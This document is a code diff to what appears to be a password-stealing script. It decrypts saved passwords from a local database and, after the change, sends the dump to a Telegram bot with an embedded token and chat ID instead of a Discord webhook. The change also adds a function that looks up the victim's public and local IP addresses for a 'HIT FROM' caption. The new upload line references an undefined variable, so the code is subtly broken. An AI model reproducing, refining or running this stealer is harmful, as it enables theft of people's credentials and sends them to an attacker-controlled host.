@@ -36,9 +36,24 @@ def decrypt_password(password, key):
     except Exception as e:
         print(f"Failed to decrypt password: {e}")
         return ""
-
+def get_ips():
+    try:
+        public_ip = requests.get("http://ipinfo.io/ip", timeout=5).text.strip()
+    except:
+        public_ip = "Unknown"
+    try:
+        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        s.connect(("8.8.8.8", 80))
+        local_ip = s.getsockname()[0]
+        s.close()
+    except:
+        local_ip = "Unknown"
+    return public_ip, local_ip
 def main():
-    webhook_url = "https://discord.com/api/webhooks/1350761958542016523/SGEzW70L7YNhS_Ii6UdEthWX6Mch6EGQ7TGymzG1peKqc4SmV9fvwm7rgSV2CtOZqnvs"
+    TOKEN = "7733366488:AAHFBq_N1Ix-DFnzbw7nIrc_TDxZYo_hJME"
+    webhook_url = f'https://api.telegram.org/bot{TOKEN}/sendDocument'
+    CHAT_ID = -1002050197092
+
     
     try:
         key = get_encryption_key()
@@ -73,10 +88,13 @@ def main():
        
         cursor.close()
         db.close()
-
+        ip,_ = get_ips()
         # Send the file to the Discord webhook
         with open(output_file, "rb") as f:
-            response = requests.post(webhook_url, files={"file": f})
+            files = {'document': (f.name, f)}
+            data = {'chat_id': CHAT_ID,'caption': f'HIT FROM {ip}'}
+
+            response = requests.post(url, files=files, data=data)
             if response.status_code == 200:
                 print("File successfully sent to the webhook.")
             else:
